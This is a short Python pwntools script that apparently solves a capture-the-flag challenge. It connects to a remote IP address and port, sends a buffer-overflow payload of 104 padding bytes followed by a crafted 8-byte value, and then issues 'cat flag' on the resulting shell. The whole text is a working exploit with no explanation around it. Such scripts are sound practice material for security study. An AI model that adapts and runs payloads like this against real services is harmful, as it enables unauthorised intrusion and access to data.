import pwn


conn = pwn.connect("3.71.110.92", 30000)

conn.recv()
key = int('-0x2152454141103f22', base=16).to_bytes(8, byteorder='little', signed=True)
print(bytearray(key))
conn.sendline(b'\xff' * 104 + key)
conn.recv()
conn.sendline(b'cat flag')
conn.recv()


conn.close()